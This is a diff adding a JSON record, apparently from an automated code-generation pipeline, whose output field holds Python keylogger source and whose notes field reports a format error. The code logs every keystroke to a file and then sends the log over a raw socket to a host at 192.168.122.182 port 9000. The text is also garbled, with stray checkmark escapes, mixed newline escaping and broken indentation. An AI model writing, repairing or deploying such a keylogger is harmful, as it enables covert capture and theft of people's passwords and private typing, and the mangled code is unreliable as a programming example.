@@ -1,0 +1,6 @@
+{
+  "output": "import socket\nimport os\nfrom pynput.keyboard import Key, Listener\n\ndef on_press(key):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            keyData = str(key) + '\n'\n            f.write(keyData)\n            print(f'{key} pressed \\u2713')\n    except Exception as e:\\nprint(e)\n        pass\n\ndef on_release(key):\n    pass\n\nwith Listener(on_press=on_press, on_release=on_release) as listener:\n    \n    try:\n        listener.join() \\u2713\n    finally:\n        with open('keylogs.txt', 'rb') as f:\\n            fileContent = f.read() \\u2713\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\ns.connect((\"192.168.122.182\", 9000))\\ns.sendall(fileContent)\\n            print('[+] Keylogs sent to server')\n",
+  "notes": "ERROR: Generator Format Error",
+  "applied_fixes": [],
+  "iterations": 4
+}
